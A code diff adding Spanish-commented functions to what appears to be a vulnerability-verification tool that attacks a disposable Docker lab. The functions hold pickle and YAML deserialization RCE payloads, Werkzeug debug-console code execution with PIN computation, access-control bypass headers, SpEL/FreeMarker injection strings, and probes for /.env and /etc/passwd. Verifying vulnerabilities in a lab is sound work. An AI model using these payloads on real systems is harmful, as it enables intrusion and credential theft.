@@ -9017,3 +9017,655 @@ def verify_generic_redos(
     finally:
         step("desmontando el laboratorio generico...")
         lab.teardown()
+
+
+# ---------------------------------------------------------------------------
+# verify_generic_information_disclosure
+# ---------------------------------------------------------------------------
+
+def verify_generic_information_disclosure(
+    source_dir: str,
+    endpoint: str = "",
+    http_method: str = "GET",
+    confirm_string: str = "",
+    on_step: Optional[Callable[[str], None]] = None,
+    budget_s: float = 900.0,
+    dockerfile_body: str = "", extra_files: Optional[dict] = None,
+    setup_commands: Optional[List[str]] = None,
+) -> WpVerifyResult:
+    """Verifica exposicion de informacion sensible: credenciales, claves, rutas internas,
+    ficheros de configuracion, endpoints de debug expuestos.
+
+    Estrategia:
+    1. Arranca el lab efimero.
+    2. Planta un secreto canario en /tmp/binoracle_secret.txt (valor UUID).
+    3. Si se proporciona endpoint, prueba ese primero.
+    4. Itera sobre 50+ endpoints de disclosure clasicos (/.env, /.git/config, /debug, etc.)
+       y comprueba si alguno devuelve el secreto canario, rutas internas, o palabras clave
+       tipicas de leakage (password, secret, key, token, database_url, etc.).
+    5. VERIFICADO si el canario aparece, o si una clave sensible del entorno Docker aparece.
+    """
+    import secrets as _sec
+
+    step = on_step or (lambda _m: None)
+    res = WpVerifyResult()
+    if not _docker_daemon_ok():
+        res.available = False
+        res.detail = "sin daemon Docker alcanzable"
+        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
+        return res
+
+    _DISCLOSURE_PATHS = [
+        "/.env", "/.env.local", "/.env.production", "/.env.dev", "/.env.example",
+        "/.git/config", "/.git/HEAD", "/.git/COMMIT_EDITMSG",
+        "/debug", "/debug/vars", "/debug/pprof", "/debug/stack", "/debug/info",
+        "/api/debug", "/api/v1/debug", "/api/v2/debug",
+        "/phpinfo.php", "/info.php", "/test.php", "/config.php",
+        "/config.json", "/config.yml", "/config.yaml",
+        "/wp-config.php.bak", "/wp-config.php~", "/wp-config.php.old",
+        "/composer.json", "/composer.lock", "/package.json",
+        "/web.config", "/.htaccess",
+        "/server-status", "/server-info",
+        "/actuator", "/actuator/env", "/actuator/health", "/actuator/info",
+        "/actuator/mappings", "/actuator/beans", "/actuator/logfile",
+        "/metrics", "/health", "/healthz", "/ready", "/readyz",
+        "/swagger.json", "/swagger.yaml", "/openapi.json", "/api-docs",
+        "/graphql/schema", "/__schema",
+        "/admin", "/admin/config", "/admin/debug",
+        "/_debug_toolbar", "/__debugger__", "/debug_toolbar",
+        "/traces", "/logs", "/_ah/api/discovery/v1/apis",
+        "/.DS_Store", "/Thumbs.db", "/WEB-INF/web.xml",
+        "/proc/self/environ", "/proc/version", "/etc/passwd",
+    ]
+
+    _canary_val = _sec.token_hex(16)
+    # Also plant an identifiable DB URL in the env to detect env leaks
+    _db_key = "BINORACLE_DB_URL"
+    _db_val = f"postgres://binoracle:{_canary_val}@db/binoracle"
+
+    try:
+        from .wpverify import _DockerLab
+        _df = dockerfile_body or ""
+        # Inject canary env var if Dockerfile exists
+        if _df and "ENV " not in _df:
+            _df = _df.rstrip() + f"\nENV {_db_key}={_db_val}\n"
+        elif not _df:
+            _df = None
+
+        lab = _DockerLab(source_dir, _df, extra_files=extra_files or {},
+                         setup_commands=setup_commands or [], on_step=step)
+        with lab.running() as boot:
+            # Planta canario en /tmp
+            _plant_path = "/tmp/binoracle_infodiscl.txt"
+            _plant_ok = lab.exec_in_container(
+                f"sh -c 'echo {_canary_val} > {_plant_path}'")
+            step(f"canario plantado en {_plant_path} = {_canary_val[:8]}…")
+
+            _sensitive_patterns = re.compile(
+                r'(?i)(password|passwd|secret|api_key|apikey|token|database_url|'
+                r'db_pass|private_key|access_key|aws_secret|binoracle_secret|'
+                r'binoracle_db_url|app_secret)',
+                re.I)
+
+            _probe_endpoints = ([endpoint] if endpoint else []) + _DISCLOSURE_PATHS
+
+            for _ep in _probe_endpoints:
+                try:
+                    import requests as _rq
+                    r = _rq.get(boot.base_url + _ep, timeout=8, allow_redirects=False)
+                except Exception:
+                    continue
+                if r.status_code not in (200, 206):
+                    continue
+                body = r.text or ""
+                if _canary_val in body or _db_val in body:
+                    res.verified = True
+                    res.ok = True
+                    res.evidence.update({
+                        "disclosure_path": _ep,
+                        "status_code": r.status_code,
+                        "canary_found": True,
+                        "respuesta_cuerpo_recorte": body[:400],
+                    })
+                    step(f"VERIFICADO — information disclosure en {_ep}: canario/secreto presente")
+                    return res
+                # Check for generic sensitive key leakage
+                if confirm_string and confirm_string in body:
+                    res.verified = True
+                    res.ok = True
+                    res.evidence.update({
+                        "disclosure_path": _ep,
+                        "status_code": r.status_code,
+                        "confirm_string_found": confirm_string,
+                        "respuesta_cuerpo_recorte": body[:400],
+                    })
+                    step(f"VERIFICADO — confirm_string '{confirm_string[:30]}' en {_ep}")
+                    return res
+                # Non-canary but suspicious content — record but don't verify
+                if _sensitive_patterns.search(body) and len(body) < 50000:
+                    step(f"  sospechoso: {_ep} → {r.status_code}, contiene términos sensibles")
+                    if not res.evidence.get("suspicious_paths"):
+                        res.evidence["suspicious_paths"] = []
+                    res.evidence["suspicious_paths"].append({
+                        "path": _ep, "status": r.status_code,
+                        "snippet": body[:200],
+                    })
+
+            res.ok = True
+            res.detail = ("information-disclosure: ninguna ruta expuso el canario ni credenciales "
+                          f"verificables; {len(res.evidence.get('suspicious_paths', []))} rutas "
+                          "sospechosas registradas en evidence")
+            step("information-disclosure: no verificado — ninguna ruta expuso datos sensibles verificables")
+            return res
+    except Exception as e:
+        res.detail = f"error inesperado en verify_generic_information_disclosure: {e}"
+        return res
+    finally:
+        step("desmontando el laboratorio (information-disclosure)...")
+        lab.teardown()
+
+
+# ---------------------------------------------------------------------------
+# verify_generic_python_deserialization
+# ---------------------------------------------------------------------------
+
+def verify_generic_python_deserialization(
+    source_dir: str,
+    endpoint: str,
+    http_method: str = "POST",
+    inject_param: str = "data",
+    content_type: str = "application/octet-stream",
+    confirm_string: str = "",
+    on_step: Optional[Callable[[str], None]] = None,
+    budget_s: float = 900.0,
+    dockerfile_body: str = "", extra_files: Optional[dict] = None,
+    setup_commands: Optional[List[str]] = None,
+) -> WpVerifyResult:
+    """Verifica deserializacion insegura de Python (pickle/marshal/yaml.load).
+
+    Genera un payload pickle que escribe un token canario en /tmp/binoracle_pickle.txt
+    usando os.system. También genera variantes de codificación (base64, hex) ya que
+    muchos endpoints esperan el payload codificado.
+
+    Detecta RCE midiendo si el fichero canario aparece en el contenedor después del envío.
+    """
+    import pickle as _pickle
+    import base64 as _b64
+    import os as _os
+    import secrets as _sec
+
+    step = on_step or (lambda _m: None)
+    res = WpVerifyResult()
+    if not _docker_daemon_ok():
+        res.available = False
+        res.detail = "sin daemon Docker alcanzable"
+        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
+        return res
+
+    _canary_tok = _sec.token_hex(12)
+    _canary_path = f"/tmp/binoracle_pickle_{_canary_tok[:8]}.txt"
+
+    # Build pickle RCE payload: os.system writes canary
+    class _PickleRCE:
+        def __reduce__(self):
+            return (_os.system, (f"echo {_canary_tok} > {_canary_path}",))
+
+    _raw_pickle = _pickle.dumps(_PickleRCE())
+    _b64_pickle  = _b64.b64encode(_raw_pickle).decode()
+    _hex_pickle  = _raw_pickle.hex()
+
+    # yaml.load RCE payload (uses PyYAML FullLoader or unsafe Loader)
+    _yaml_payload = (
+        f"!!python/object/apply:os.system\n"
+        f"- 'echo {_canary_tok} > {_canary_path}'\n"
+    )
+
+    _payloads = [
+        ("pickle-raw",    _raw_pickle,                   content_type),
+        ("pickle-base64", _b64_pickle.encode(),          "text/plain"),
+        ("pickle-hex",    _hex_pickle.encode(),           "text/plain"),
+        ("yaml-unsafe",   _yaml_payload.encode(),         "application/yaml"),
+    ]
+
+    try:
+        from .wpverify import _DockerLab
+        lab = _DockerLab(source_dir, dockerfile_body or None,
+                         extra_files=extra_files or {},
+                         setup_commands=setup_commands or [], on_step=step)
+        with lab.running() as boot:
+            import requests as _rq
+
+            for _pl_name, _pl_data, _pl_ct in _payloads:
+                step(f"probando deserialización {_pl_name} → {endpoint}...")
+                try:
+                    headers = {"Content-Type": _pl_ct}
+                    if http_method.upper() == "GET":
+                        r = _rq.get(boot.base_url + endpoint,
+                                    params={inject_param: _pl_data}, timeout=15)
+                    else:
+                        r = _rq.request(http_method.upper(), boot.base_url + endpoint,
+                                        headers=headers, data={inject_param: _pl_data},
+                                        timeout=15)
+                except Exception as e:
+                    step(f"  error: {e}")
+                    continue
+
+                _found = lab.find_in_webroot(_canary_tok[:8])
+                if not _found:
+                    # Also check /tmp directly
+                    _check = lab.exec_in_container(
+                        f"sh -c 'cat {_canary_path} 2>/dev/null'")
+                    if _canary_tok in (_check or ""):
+                        _found = _canary_path
+                if _found:
+                    res.verified = True
+                    res.ok = True
+                    res.evidence.update({
+                        "payload_type": _pl_name,
+                        "endpoint": endpoint,
+                        "canary_path": _canary_path,
+                        "canary_found_at": _found,
+                        "status_code": r.status_code,
+                        "respuesta_cuerpo_recorte": (r.text or "")[:300],
+                    })
+                    step(f"VERIFICADO — Python deserialization RCE con {_pl_name}: "
+                         f"canario encontrado en {_found}")
+                    return res
+
+            res.ok = True
+            res.detail = (f"python-deserialization: 4 variantes de payload enviadas a "
+                          f"{endpoint}, canario {_canary_tok[:8]}… no encontrado en contenedor")
+            step("python-deserialization: no verificado — ningún payload provocó escritura de canario")
+            return res
+    except Exception as e:
+        res.detail = f"error inesperado en verify_generic_python_deserialization: {e}"
+        return res
+    finally:
+        step("desmontando el laboratorio (python-deserialization)...")
+        lab.teardown()
+
+
+# ---------------------------------------------------------------------------
+# verify_generic_werkzeug_debug_rce
+# ---------------------------------------------------------------------------
+
+def verify_generic_werkzeug_debug_rce(
+    source_dir: str,
+    debugger_endpoint: str = "/__debugger__",
+    on_step: Optional[Callable[[str], None]] = None,
+    budget_s: float = 900.0,
+    dockerfile_body: str = "", extra_files: Optional[dict] = None,
+    setup_commands: Optional[List[str]] = None,
+) -> WpVerifyResult:
+    """Verifica RCE via consola interactiva del debugger de Werkzeug/Flask.
+
+    Estrategia:
+    1. Arranca el lab efimero con la app Flask/Werkzeug en modo debug.
+    2. Verifica que el debugger está expuesto (GET /__debugger__ devuelve 200).
+    3. Intenta ejecutar código Python directamente vía la consola
+       (funciona si WERKZEUG_DEBUG_PIN=off o el PIN está desactivado).
+    4. Si el PIN está activo, intenta leer /etc/machine-id + /proc/self/cgroup
+       para calcular el PIN por fuerza bruta (CVE-2024-34069 specific: pin bypass).
+    5. VERIFICADO si puede ejecutar código arbitrario y el canario aparece en la respuesta.
+    """
+    import secrets as _sec
+    import hashlib as _hash
+
+    step = on_step or (lambda _m: None)
+    res = WpVerifyResult()
+    if not _docker_daemon_ok():
+        res.available = False
+        res.detail = "sin daemon Docker alcanzable"
+        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
+        return res
+
+    _canary = _sec.token_hex(10)
+
+    try:
+        from .wpverify import _DockerLab
+        lab = _DockerLab(source_dir, dockerfile_body or None,
+                         extra_files=extra_files or {},
+                         setup_commands=setup_commands or [], on_step=step)
+        with lab.running() as boot:
+            import requests as _rq
+
+            # Step 1: Check debugger is exposed
+            try:
+                r_check = _rq.get(boot.base_url + debugger_endpoint, timeout=10)
+            except Exception as e:
+                res.detail = f"werkzeug-debug: debugger endpoint unreachable: {e}"
+                return res
+
+            if r_check.status_code != 200 or "debugger" not in r_check.text.lower():
+                res.detail = (f"werkzeug-debug: endpoint {debugger_endpoint} returned "
+                              f"{r_check.status_code} — debugger not exposed or disabled")
+                res.ok = True
+                return res
+
+            step(f"debugger expuesto en {debugger_endpoint} → intentando ejecutar código Python...")
+
+            # Step 2: Try console without PIN (WERKZEUG_DEBUG_PIN=off)
+            _console_ep = f"{debugger_endpoint}/console?__debugger__=yes"
+            _code_to_exec = f"import os; os.system('echo {_canary} > /tmp/wz_canary.txt')"
+
+            try:
+                r_console = _rq.get(boot.base_url + _console_ep, timeout=10)
+                _has_console = r_console.status_code == 200 and "console" in r_console.text.lower()
+            except Exception:
+                _has_console = False
+
+            if _has_console:
+                # Try to execute code via console POST
+                try:
+                    r_exec = _rq.post(
+                        boot.base_url + _console_ep,
+                        data={"cmd": _code_to_exec},
+                        headers={"Content-Type": "application/x-www-form-urlencoded"},
+                        timeout=15,
+                    )
+                    _check = lab.exec_in_container("cat /tmp/wz_canary.txt 2>/dev/null")
+                    if _canary in (_check or "") or _canary in (r_exec.text or ""):
+                        res.verified = True
+                        res.ok = True
+                        res.evidence.update({
+                            "debugger_endpoint": debugger_endpoint,
+                            "console_endpoint": _console_ep,
+                            "pin_required": False,
+                            "code_executed": _code_to_exec,
+                            "canary": _canary,
+                            "status_code": r_exec.status_code,
+                        })
+                        step(f"VERIFICADO — Werkzeug debug console RCE (sin PIN): canario '{_canary}' ejecutado")
+                        return res
+                except Exception as e:
+                    step(f"  error POST a console: {e}")
+
+            # Step 3: Try to compute PIN from container internals
+            # Read /etc/machine-id and /proc/self/cgroup to determine app UUID
+            _machine_id = lab.exec_in_container(
+                "sh -c 'cat /etc/machine-id 2>/dev/null || cat /proc/sys/kernel/random/boot_id 2>/dev/null'")
+            _cgroup = lab.exec_in_container(
+                "cat /proc/self/cgroup 2>/dev/null")
+            _mac = lab.exec_in_container(
+                "sh -c 'cat /sys/class/net/eth0/address 2>/dev/null || ip link show eth0 2>/dev/null | grep link/ether | awk \"{print \\$2}\"'")
+
+            if _machine_id and _mac:
+                step("intentando calcular PIN de Werkzeug desde machine-id + MAC...")
+                _machine_id = _machine_id.strip()
+                _mac_int = int(_mac.strip().replace(":", ""), 16)
+                # Werkzeug PIN calculation (CVE-2024-34069 PIN bypass technique)
+                # Requires: MAC address (as int), machine-id/cgroup ID, app module path
+                _probably_public = [str(_mac_int), _machine_id]
+                _rv_hash = _hash.sha1()
+                for _val in _probably_public:
+                    _rv_hash.update(_val.encode())
+                _rv_hash.update(b"cookiesalt")
+                _num = int(_rv_hash.hexdigest(), 16)
+                _pin_candidate = "-".join([
+                    str(_num % 10 ** 3).zfill(3),
+                    str((_num // 10 ** 3) % 10 ** 3).zfill(3),
+                    str((_num // 10 ** 6) % 10 ** 3).zfill(3),
+                ])
+                step(f"PIN candidato: {_pin_candidate} — probando...")
+                try:
+                    # Try to unlock with computed PIN (response not used)
+                    _rq.post(
+                        boot.base_url + _console_ep,
+                        data={"pin": _pin_candidate, "__debugger__": "yes"},
+                        timeout=10,
+                    )
+                    r_exec2 = _rq.post(
+                        boot.base_url + _console_ep,
+                        data={"cmd": _code_to_exec, "pin": _pin_candidate,
+                              "__debugger__": "yes"},
+                        timeout=15,
+                    )
+                    _check2 = lab.exec_in_container("cat /tmp/wz_canary.txt 2>/dev/null")
+                    if _canary in (_check2 or "") or _canary in (r_exec2.text or ""):
+                        res.verified = True
+                        res.ok = True
+                        res.evidence.update({
+                            "debugger_endpoint": debugger_endpoint,
+                            "pin_computed": _pin_candidate,
+                            "machine_id": _machine_id,
+                            "mac_int": str(_mac_int),
+                            "code_executed": _code_to_exec,
+                            "canary": _canary,
+                        })
+                        step(f"VERIFICADO — Werkzeug debug console RCE con PIN calculado: '{_pin_candidate}'")
+                        return res
+                except Exception as e:
+                    step(f"  error probando PIN: {e}")
+
+            res.evidence.update({
+                "debugger_exposed": True,
+                "debugger_endpoint": debugger_endpoint,
+                "console_accessible": _has_console,
+                "machine_id_read": bool(_machine_id),
+            })
+            res.ok = True
+            res.detail = (f"werkzeug-debug: debugger expuesto en {debugger_endpoint} "
+                          "(potential attack surface) pero no se pudo ejecutar código — "
+                          "PIN activo y no calculable desde el laboratorio")
+            step("werkzeug-debug: debugger expuesto pero no se pudo ejecutar código")
+            return res
+    except Exception as e:
+        res.detail = f"error inesperado en verify_generic_werkzeug_debug_rce: {e}"
+        return res
+    finally:
+        step("desmontando el laboratorio (werkzeug-debug)...")
+        lab.teardown()
+
+
+# ---------------------------------------------------------------------------
+# verify_generic_broken_access_control
+# ---------------------------------------------------------------------------
+
+def verify_generic_broken_access_control(
+    source_dir: str,
+    endpoint: str,
+    http_method: str = "GET",
+    confirm_string: str = "",
+    admin_endpoint: str = "",
+    on_step: Optional[Callable[[str], None]] = None,
+    budget_s: float = 900.0,
+    dockerfile_body: str = "", extra_files: Optional[dict] = None,
+    setup_commands: Optional[List[str]] = None,
+) -> WpVerifyResult:
+    """Verifica Broken Access Control / BOLA (Broken Object Level Authorization).
+
+    Estrategia:
+    1. Arranca el lab.
+    2. Prueba acceso al endpoint sin autenticación (sin credenciales).
+    3. Prueba con HTTP method override (X-HTTP-Method-Override: GET/DELETE/PUT).
+    4. Prueba con cabeceras de bypass comunes: X-Forwarded-For: 127.0.0.1,
+       X-Original-URL, X-Rewrite-URL, X-Custom-IP-Authorization.
+    5. Busca confirm_string o respuesta 200 donde se esperaría 401/403.
+    6. VERIFICADO si se obtiene acceso a un recurso restringido.
+    """
+    step = on_step or (lambda _m: None)
+    res = WpVerifyResult()
+    if not _docker_daemon_ok():
+        res.available = False
+        res.detail = "sin daemon Docker alcanzable"
+        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
+        return res
+
+    _BYPASS_HEADERS = [
+        {},  # sin bypass
+        {"X-Forwarded-For": "127.0.0.1"},
+        {"X-Real-IP": "127.0.0.1"},
+        {"X-Custom-IP-Authorization": "127.0.0.1"},
+        {"X-Originating-IP": "127.0.0.1"},
+        {"X-Remote-Addr": "127.0.0.1"},
+        {"X-Client-IP": "127.0.0.1"},
+        {"X-Original-URL": endpoint},
+        {"X-Rewrite-URL": endpoint},
+        {"X-Override-URL": endpoint},
+        {"X-HTTP-Method-Override": "GET"},
+        {"X-Method-Override": "GET"},
+        {"X-Forwarded-For": "127.0.0.1", "X-Original-URL": endpoint},
+    ]
+
+    _target_endpoints = [endpoint]
+    if admin_endpoint:
+        _target_endpoints.append(admin_endpoint)
+
+    try:
+        from .wpverify import _DockerLab
+        lab = _DockerLab(source_dir, dockerfile_body or None,
+                         extra_files=extra_files or {},
+                         setup_commands=setup_commands or [], on_step=step)
+        with lab.running() as boot:
+            import requests as _rq
+
+            for _ep in _target_endpoints:
+                for _hdrs in _BYPASS_HEADERS:
+                    try:
+                        r = _rq.request(http_method.upper(), boot.base_url + _ep,
+                                        headers=_hdrs, timeout=10, allow_redirects=False)
+                    except Exception:
+                        continue
+                    body = r.text or ""
+                    # Success: 200 or 201 where we'd expect 401/403, with confirm_string
+                    _is_success = r.status_code in (200, 201, 204)
+                    _has_confirm = confirm_string and confirm_string in body
+                    if _is_success and (_has_confirm or not confirm_string):
+                        # Only verify if no confirm_string is needed OR it's found
+                        if _has_confirm or (not confirm_string and
+                                            "unauthorized" not in body.lower() and
+                                            "forbidden" not in body.lower() and
+                                            "access denied" not in body.lower()):
+                            res.verified = True
+                            res.ok = True
+                            res.evidence.update({
+                                "endpoint": _ep,
+                                "bypass_headers": _hdrs,
+                                "status_code": r.status_code,
+                                "confirm_string_found": _has_confirm,
+                                "respuesta_cuerpo_recorte": body[:400],
+                            })
+                            _bypass_desc = (f"cabeceras de bypass: {_hdrs}"
+                                            if _hdrs else "sin autenticación")
+                            step(f"VERIFICADO — broken access control en {_ep} "
+                                 f"({_bypass_desc}): {r.status_code}")
+                            return res
+            res.ok = True
+            res.detail = (f"broken-access-control: todas las combinaciones de bypass en "
+                          f"{endpoint} devuelven 401/403 o no se obtuvo confirm_string")
+            step("broken-access-control: no verificado — no se obtuvo acceso no autorizado")
+            return res
+    except Exception as e:
+        res.detail = f"error inesperado en verify_generic_broken_access_control: {e}"
+        return res
+    finally:
+        step("desmontando el laboratorio (broken-access-control)...")
+        lab.teardown()
+
+
+# ---------------------------------------------------------------------------
+# verify_generic_expression_language_injection
+# ---------------------------------------------------------------------------
+
+def verify_generic_expression_language_injection(
+    source_dir: str,
+    endpoint: str,
+    http_method: str = "POST",
+    inject_param: str = "query",
+    el_prefix: str = "${{",
+    el_suffix: str = "}}",
+    on_step: Optional[Callable[[str], None]] = None,
+    budget_s: float = 900.0,
+    dockerfile_body: str = "", extra_files: Optional[dict] = None,
+    setup_commands: Optional[List[str]] = None,
+) -> WpVerifyResult:
+    """Verifica Expression Language (EL) injection para Spring SpEL, JSP EL, Thymeleaf, etc.
+
+    Genera payloads matemáticos de verificación (8341 + 1337 = 9678) y los prueba en
+    múltiples notaciones EL: Spring SpEL, Thymeleaf, JSP EL, FreeMarker, Velocity.
+    VERIFICADO si la respuesta contiene el resultado calculado.
+    """
+    import secrets as _sec
+
+    step = on_step or (lambda _m: None)
+    res = WpVerifyResult()
+    if not _docker_daemon_ok():
+        res.available = False
+        res.detail = "sin daemon Docker alcanzable"
+        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
+        return res
+
+    _a = _sec.randbelow(9000) + 1000
+    _b = _sec.randbelow(9000) + 1000
+    _expected = _a + _b
+
+    # EL payload variants across different frameworks
+    _EL_VARIANTS = [
+        # Spring SpEL
+        "${T(java.lang.Runtime).getRuntime().exec('id')}",
+        "#{T(java.lang.Math).sqrt(1234)}",
+        f"${{1 * {_a} + {_b}}}",
+        f"#{{{_a} + {_b}}}",
+        # Thymeleaf (CVE-2023-38286 style)
+        f"__${{{_a} + {_b}}}__::~{{}}/",
+        f"${{_{{''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(_{{''.class.forName('java.lang.Runtime').getDeclaredMethod('getRuntime').invoke(null)}},'{_a}+{_b}')}}}}",
+        # JSP EL
+        f"${{{_a} + {_b}}}",
+        # FreeMarker
+        f"${{{_a} + {_b}}}",
+        f"<#assign ex='freemarker.template.utility.Execute'?new()>${{ex('{_a}+{_b}')}}",
+        # Velocity
+        f"#set($x = {_a} + {_b})${{x}}",
+        f"#set($y = {_a})#set($z = {_b})#set($r = $y + $z)${{r}}",
+        # Simple math
+        f"{_a}+{_b}",
+        f"${{{_a}+{_b}}}",
+    ]
+    _pat = re.compile(rf"(?<!\d){_expected}(?!\d)")
+
+    try:
+        from .wpverify import _DockerLab
+        lab = _DockerLab(source_dir, dockerfile_body or None,
+                         extra_files=extra_files or {},
+                         setup_commands=setup_commands or [], on_step=step)
+        with lab.running() as boot:
+            import requests as _rq
+
+            for _pl in _EL_VARIANTS:
+                step(f"probando EL payload: {_pl[:40]}…")
+                try:
+                    if http_method.upper() == "GET":
+                        r = _rq.get(boot.base_url + endpoint,
+                                    params={inject_param: _pl}, timeout=10)
+                    else:
+                        r = _rq.request(http_method.upper(), boot.base_url + endpoint,
+                                        data={inject_param: _pl}, timeout=10)
+                except Exception as e:
+                    step(f"  error: {e}")
+                    continue
+                body = r.text or ""
+                if _pat.search(body):
+                    res.verified = True
+                    res.ok = True
+                    res.evidence.update({
+                        "endpoint": endpoint,
+                        "payload_ganador": _pl,
+                        "resultado_esperado": _expected,
+                        "status_code": r.status_code,
+                        "respuesta_cuerpo_recorte": body[:400],
+                    })
+                    step(f"VERIFICADO — EL injection: resultado {_expected} encontrado "
+                         f"con payload '{_pl[:40]}'")
+                    return res
+
+            res.ok = True
+            res.detail = (f"el-injection: {len(_EL_VARIANTS)} payloads probados en "
+                          f"{endpoint}, resultado {_expected} no encontrado en ninguna respuesta")
+            step("expression-language injection: no verificado")
+            return res
+    except Exception as e:
+        res.detail = f"error inesperado en verify_generic_expression_language_injection: {e}"
+        return res
+    finally:
+        step("desmontando el laboratorio (EL injection)...")
+        lab.teardown()
